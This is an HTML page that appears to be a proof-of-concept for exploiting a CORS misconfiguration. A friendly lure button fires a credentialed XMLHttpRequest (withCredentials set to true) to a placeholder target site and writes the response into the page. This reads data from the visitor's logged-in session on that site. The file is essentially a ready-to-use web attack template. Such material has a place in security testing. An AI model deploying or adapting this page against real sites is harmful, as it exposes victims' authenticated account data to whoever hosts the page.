<!DOCTYPE html>
<html>
<body>

<div id="demo"><br>
<h1>We Welcome Great people like You!!!</h1>
<button type="button" onclick="loadDoc()">Click here to Show Content</button>
</div>

<script>
function loadDoc() {
  var xhttp = new XMLHttpRequest();
  xhttp.onreadystatechange = function() {
    if (this.readyState == 4 || this.status == 200 || this.status == 401 || this.status == 404 || this.status == 403 || this.status == 500) {
      document.getElementById("demo").innerHTML = this.responseText;
    }
  };
  xhttp.open("GET", "https://<target_site>", true);
  xhttp.withCredentials = true;
  var body = "";
  var aBody = new Uint8Array(body.length);
  for (var i = 0; i < aBody.length; i++)
    aBody[i] = body.charCodeAt(i);
  xhttp.send((new Blob([aBody])));
}
</script>
